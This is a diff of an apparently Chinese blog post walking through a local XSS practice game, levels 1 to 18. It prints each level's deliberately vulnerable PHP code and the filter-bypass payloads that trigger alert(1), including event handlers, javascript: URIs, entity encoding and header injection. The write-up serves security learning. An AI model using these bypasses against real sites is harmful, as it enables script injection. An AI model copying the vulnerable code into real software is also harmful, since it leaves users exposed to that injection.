@@ -408,19 +408,19 @@ height:50vh;
 <p>实验环境也可以本地搭建，不过需要php+mysql的环境：</p>
 <p>xss通关小游戏：<a href="https://pan.baidu.com/s/1zS2GwTNbMBXEF2yNEBeLgA" target="_blank" rel="noopener">https://pan.baidu.com/s/1zS2GwTNbMBXEF2yNEBeLgA</a>   密码：85g8</p>
 <p>我这里使用本地搭建，方便分析代码，安装好的页面如下：</p>
-<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img"></p>
+<p><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image002.jpg" alt="img"></p>
 <p><strong>Level 1:</strong></p>
-<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" alt="img"></strong></p>
+<p><strong><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image004.jpg" alt="img"></strong></p>
 <p>分析一下源代码中的判断xss的代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = $_GET[&quot;name&quot;];</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>根据代码发现，变量$str从url接受一个get类型的name参数，并且没有对传入的name参数进行任何过滤</p>
 <p>直接echo出来，我们可以直接构造任意可弹窗payload,</p>
-<p>这里使用最基本的：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，也可以使用 &lt;svg/onload=alert(1)&gt; 等…</p>
-<p> <img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg" alt="img"></p>
+<p>这里使用最基本的：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，也可以使用 <code>&lt;svg/onload=alert(1)&gt;</code> 等…</p>
+<p> <img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image006.jpg" alt="img"></p>
 <p>成功过关！</p>
 <p><strong>Level 2:</strong></p>
-<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg" alt="img"></strong></p>
+<p><strong><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image008.jpg" alt="img"></strong></p>
 <p>从图中可以看出这是一个典型的搜索框xss，</p>
 <p>分析一下源代码中的判断xss的代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str.&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -429,16 +429,16 @@ height:50vh;
 <p>这个函数把预定义的字符转换为 HTML 实体，等于&lt;不能用，这时候一种方法是黑名单绕过，就是不使用被过滤的符号，使用js的事件：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload :  &quot; onclick=alert(1)这样需要点击一下输入框&lt;br&gt;</span><br><span class="line"></span><br><span class="line">           &quot; onmouseover=alert(1)&gt;需要鼠标划过输入框&lt;br&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg" alt="img"></p>
+<p><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image010.jpg" alt="img"></p>
 <p>另外一种方法就是在构造payload就要将input的文本框本分提前闭合，不影响我们弹框代码，</p>
-<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg" alt="img"></p>
+<p><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image012.jpg" alt="img"></p>
 <p>我这里使用  <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
 <p>这样的话 : <code>&lt;input name=&quot;keyword&quot; value=&quot;  &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></p>
 <p>这样value=”  “，不会检查我们的弹窗代码</p>
-<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg" alt="img"></p>
+<p><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image014.jpg" alt="img"></p>
 <p>成功过关！！！</p>
 <p><strong>Level 3:</strong></p>
-<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg" alt="img"></strong></p>
+<p><strong><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image016.jpg" alt="img"></strong></p>
 <p>分析一下源代码中的判断xss的代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
@@ -446,10 +446,10 @@ height:50vh;
 <p>上题尝试闭合&lt;””&gt;构造<code>&lt;script&gt;</code> 弹窗方法失效了，应为value中的&lt;被转义了，只能利用上题中的js时间</p>
 <p>来构造弹窗，不过这里需要用单引号闭合，构造<code>payload :  &#39; onmouseover=alert(1)//</code></p>
 <p>这样的话： <code>&lt;input name=keyword value=&#39;  &#39; onmouseover=alert(1)// &#39;&gt;</code></p>
-<p> <img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg" alt="img"></p>
+<p> <img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image018.jpg" alt="img"></p>
 <p>闯关成功！！！</p>
 <p><strong>Level 4:</strong></p>
-<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg" alt="img"></strong></p>
+<p><strong><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image020.jpg" alt="img"></strong></p>
 <p>分析一下源代码中的判断xss的代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line"></span><br><span class="line">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line"></span><br><span class="line">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=level4.php method=GET&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
@@ -457,34 +457,30 @@ height:50vh;
 <p>然后在经过htmlspecialchars()函数，将一些预定义符号转换为html实体。</p>
 <p>通过这几个函数的过滤转化，我们前三关的payload肯定对不能用的。所以接下来我们需要做的就是，</p>
 <p>在没有符号“&lt;&gt;”的情况下，并且语句不被htmlspecialchars()函数影响的情况下构建payload。</p>
-<p>所以我们在这里可以构造一个输入到文本框后出现相应的事件。我们的payload：<br> “ onfocus=alert(1) autofocus=”</p>
-<p>“ onclick=alert(1) //<br> 这样我们输入的payload没有被函数过滤，并且经过htmlspecailchars()函数转换并不影响最 input文本框。所以输入后文本框内容就变成了：</p>
+<p>所以我们在这里可以构造一个输入到文本框后出现相应的事件。我们的payload：<br> <code>&quot; onfocus=alert(1) autofocus=&quot;</code></p>
+<p><code>&quot; onclick=alert(1) //</code><br> 这样我们输入的payload没有被函数过滤，并且经过htmlspecailchars()函数转换并不影响最 input文本框。所以输入后文本框内容就变成了：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword value=&quot; &quot; onfocus=alert(1) autofocus=&quot; &quot; &gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg" alt="img"></p>
-<p>&lt;input name=keyword value=” “ onclick=alert(1) //“&gt;</p>
-<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image024.jpg" alt="img"><br> Onfocus事件：定义的事件将在对象获得焦点时触发，这里指input标签获得焦点。<br> Autofocus属性：input标签的属性，当页面加载input标签，自动获得焦点。<br> 焦点：这里指你的光标的位置，也就是说当你的光标出现在input文本框这里，将进行onfocus事件的发生。</p>
+<p><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image022.jpg" alt="img"></p>
+<p><code>&lt;input name=keyword value=&quot; &quot; onclick=alert(1) //&quot;&gt;</code></p>
+<p><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image024.jpg" alt="img"><br> Onfocus事件：定义的事件将在对象获得焦点时触发，这里指input标签获得焦点。<br> Autofocus属性：input标签的属性，当页面加载input标签，自动获得焦点。<br> 焦点：这里指你的光标的位置，也就是说当你的光标出现在input文本框这里，将进行onfocus事件的发生。</p>
 <p> <strong>Level 5:</strong></p>
-<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image026.jpg" alt="img"></strong></p>
+<p><strong><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image026.jpg" alt="img"></strong></p>
 <p>分析一下源代码中的判断xss的代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line"></span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line"></span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=level5.php method=GET&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>分析代码发现，str2=strreplace(“&lt;script”,”&lt;script”,str2=strreplace(“&lt;script”,”&lt;script”,str); str3=strreplace(“on”,”on”,str3=strreplace(“on”,”on”,str2); 就直接把</p>
 <script 转换成 <scr_ipt ，on转换成 o_n ，这样就过滤了js事件，str="strtolower(str=strtolower(_GET[" keyword"]);这样" 大小写绕过也失效，不过这次没有过滤尖括号<>，这里使用伪协议来构造payload:
 
-"><iframe src=javascript:alert(1)>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;iframe src=javascript:alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;bmjoker&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt; &lt;a href=&quot;javascript:%61lert(1)&quot;&gt;bmjoker&lt;/a&gt; //</span><br></pre></td></tr></table></figure>
 
-"> <a href="javascript:alert(1)">bmjoker</a>
+这样的话： `<input name=keyword value="  "><iframe src=javascript:alert(1)>">`
 
-"> <a href="javascript:%61lert(1)">bmjoker</a> //
+![img](clip_image028.jpg)
 
-这样的话： <input name=keyword value="  "><iframe src=javascript:alert(1)>">
+`<input name=keyword value="  "><iframe src=javascript:alert(1)>">`
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image028.jpg)
-
-<input name=keyword value="  "><iframe src=javascript:alert(1)>">
-
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image030.jpg)
+![img](clip_image030.jpg)
 
 闯关成功！！！
 
@@ -492,7 +488,7 @@ height:50vh;
 
  **Level 6:**
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)
+![img](clip_image002.jpg)
 
 分析一下源代码中的判断xss的代码：
 
@@ -504,9 +500,9 @@ data 转换成 da_ta，href 转换成 hr_ef，比起上一关，发现这里没�
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;Script&gt;alert(1)&lt;/script&gt; //</span><br><span class="line"></span><br><span class="line">&quot;&gt; &lt;img Src=x OnError=alert(1)&gt; //</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;a HrEf=&quot;javascript:alert(1)&quot;&gt;bmjoker&lt;/a&gt;//</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;svg x=&quot; &quot; Onclick=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;ScriPt&gt;alert(1)&lt;sCrIpt&gt;&quot;</span><br><span class="line"></span><br><span class="line">&quot; OncliCk=alert(1) //</span><br></pre></td></tr></table></figure>
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)
+![img](clip_image004.jpg)
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg)
+![img](clip_image006.jpg)
 
 成功过关！！！
 
@@ -514,7 +510,7 @@ data 转换成 da_ta，href 转换成 hr_ef，比起上一关，发现这里没�
 
  **Level 7:**
 
-**![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg)**
+**![img](clip_image008.jpg)**
 
 分析一下源代码中的判断xss的代码：
 
@@ -526,9 +522,9 @@ data 转换成 da_ta，href 转换成 hr_ef，比起上一关，发现这里没�
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;</span><br><span class="line"></span><br><span class="line">&quot; oonnmouseover=alert(1)</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert(1)&gt;bmjoker</span><br></pre></td></tr></table></figure>
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg)
+![img](clip_image010.jpg)
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg)
+![img](clip_image012.jpg)
 
 闯关成功！！！
 
@@ -540,7 +536,7 @@ data 转换成 da_ta，href 转换成 hr_ef，比起上一关，发现这里没�
 
 **Level 8:**
 
- ![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg)
+ ![img](clip_image014.jpg)
 
 分析一下源代码中的判断xss的代码：
 
@@ -564,7 +560,7 @@ javasc&#x72;ipt:alert`1`
 
 javasc&#x0072;ipt:alert`1`
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg)
+![img](clip_image016.jpg)
 
 成功过关！！！
 
@@ -574,7 +570,7 @@ javasc&#x0072;ipt:alert`1`
 
 **Level 9:**
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg)
+![img](clip_image018.jpg)
 
 分析一下源代码中的判断xss的代码：
 
@@ -590,7 +586,7 @@ javascrip&#x74;:%0dhttp://xxx.com%0dalert(1)  //不利用注释
 
 javascrip&#x74;:%0ahttp://xxx.com%0daalert(1)  //不利用注释
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg)
+![img](clip_image020.jpg)
 
 闯关成功！！！
 
@@ -600,7 +596,7 @@ javascrip&#x74;:%0ahttp://xxx.com%0daalert(1)  //不利用注释
 
 **Level 10:**
 
-**![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg)**
+**![img](clip_image022.jpg)**
 
 分析一下源代码中的判断xss的代码：
 
@@ -614,7 +610,7 @@ javascrip&#x74;:%0ahttp://xxx.com%0daalert(1)  //不利用注释
 
 构成一个js的点击弹窗事件：
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image024.jpg)
+![img](clip_image024.jpg)
 
 闯关成功！！！
 
@@ -622,7 +618,7 @@ javascrip&#x74;:%0ahttp://xxx.com%0daalert(1)  //不利用注释
 
  **Level 11:**
 
-**![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)**
+**![img](clip_image002.jpg)**
 
 分析一下源代码中的判断xss的代码：
 
@@ -638,11 +634,11 @@ Referer: " onclick="alert(1) type="text"
 
 burp抓包，改Referer头：
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)
+![img](clip_image004.jpg)
 
 forward发包
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg)
+![img](clip_image006.jpg)
 
 闯关成功！！！
 
@@ -652,7 +648,7 @@ forward发包
 
 **Level 12:**
 
-**![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg)**
+**![img](clip_image008.jpg)**
 
 
 
@@ -670,11 +666,11 @@ User-Agent: " onclick="alert(1) type="text"
 
 burp抓包，改User-Agent头：
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg)
+![img](clip_image010.jpg)
 
 forward发包：
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg)
+![img](clip_image012.jpg)
 
 闯关成功！！！
 
@@ -682,7 +678,7 @@ forward发包：
 
 **Level 13:**
 
-**![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg)**
+**![img](clip_image014.jpg)**
 
 
 
@@ -700,11 +696,11 @@ Cookie: " onclick="alert(1) type="text"
 
 burp抓包，改cookie：
 
- ![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg)
+ ![img](clip_image016.jpg)
 
 forward发包：
 
-![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg)
+![img](clip_image018.jpg)
 
 
 
@@ -726,7 +722,7 @@ forward发包：
 
 **Level 15:**
 
-**![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg)**
+**![img](clip_image020.jpg)**
 
 分析一下源代码中的判断xss的代码：
 
@@ -755,7 +751,7 @@ confirm("完成的不错！");
 <p> src=’level1.php?name=<img src="/2019/11/20/XSS平台练习/XSS平台练习/x" onerror="alert(1)">‘</p>
 <p>emmm……</p>
 <p><strong>Level 16:</strong></p>
-<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img"></strong></p>
+<p><strong><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image002.jpg" alt="img"></strong></p>
 <p>分析一下源代码中的判断xss的代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line"></span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line"></span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line"></span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line"></span><br><span class="line">$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
@@ -764,10 +760,10 @@ confirm("完成的不错！");
 <p>&lt;img%0Dsrc=1%0Donerror=alert(1)&gt;</p>
 <p>&lt;iframe%0asrc=x%0donmouseover=alert<code>1</code>&gt;</p>
 <p>&lt;svg%0aonload=alert<code>1</code>&gt;</p>
-<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" alt="img"></p>
+<p><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image004.jpg" alt="img"></p>
 <p>闯关成功！！！</p>
 <p> <strong>Level 17:</strong></p>
-<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg" alt="img"></strong></p>
+<p><strong><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image006.jpg" alt="img"></strong></p>
 <p>分析一下源代码中的判断xss的代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
@@ -776,15 +772,15 @@ confirm("完成的不错！");
 <p>arg01=123&amp;arg02= onmouseover=alert(1)</p>
 <p>arg01=123&amp;arg02=%20onmousedown=alert<code>1</code></p>
 <p>arg01=123&amp;arg02=  onmouseover=alert(1) type=”text”</p>
-<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg" alt="img"></p>
+<p><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image008.jpg" alt="img"></p>
 <p>闯关成功！！！</p>
 <p> <strong>Level 18:</strong></p>
-<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg" alt="img"></strong></p>
+<p><strong><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image010.jpg" alt="img"></strong></p>
 <p>分析一下源代码中的判断xss的代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>分析代码，发现完全可以用上一挑战的方法，payload如上</p>
-<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg" alt="img"></p>
+<p><img src="/2019/11/20/XSS平台练习/XSS平台练习/clip_image012.jpg" alt="img"></p>
 <p> <strong>Level 19，20:</strong></p>
 <p> Flash xss没了解过…等以后学到再回来更新吧…</p>
